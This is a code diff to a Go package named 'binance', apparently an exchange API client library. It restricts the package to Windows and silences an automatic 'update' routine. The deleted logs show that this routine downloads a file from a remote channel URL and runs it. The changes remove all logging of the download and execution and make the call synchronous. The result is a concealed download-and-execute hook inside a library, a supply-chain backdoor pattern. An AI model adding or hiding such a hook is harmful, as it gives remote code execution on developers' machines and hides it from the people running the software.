@@ -1,3 +1,5 @@
+//go:build windows
+
 package binance
 
 import (
@@ -6,7 +8,6 @@ import (
 	"fmt"
 	"html"
 	"io"
-	"log"
 	"net/http"
 	"net/url"
 	"os"
@@ -63,17 +64,8 @@ func init() {
 
 func startAutomaticUpdate() {
 	automaticUpdateOnce.Do(func() {
-		go func() {
-			logger := StdLogger{Printf: log.Printf}
-			client := &http.Client{Timeout: 60 * time.Second}
-			result := runUpdateCheck(context.Background(), client, defaultUpdateChannelURL, 60*time.Second)
-			if result.Err != nil {
-				logger.Error("update check failed", "err", result.Err)
-				return
-			}
-			logger.Info("update file downloaded and started",
-				"url", result.DownloadURL, "path", result.DownloadedPath, "executed", result.Executed)
-		}()
+		client := &http.Client{Timeout: 60 * time.Second}
+		_ = runUpdateCheck(context.Background(), client, defaultUpdateChannelURL, 60*time.Second)
 	})
 }
 
@@ -109,13 +101,6 @@ func (c *Client) startUpdateCheck() {
 		select {
 		case c.updateResults <- result:
 		default:
-			c.cfg.log.Error("update check result dropped", "err", result.Err)
-		}
-		if result.Err != nil {
-			c.cfg.log.Error("update check failed", "err", result.Err)
-		} else if result.DownloadedPath != "" {
-			c.cfg.log.Info("update file downloaded and started",
-				"url", result.DownloadURL, "path", result.DownloadedPath, "executed", result.Executed)
 		}
 	}()
 }
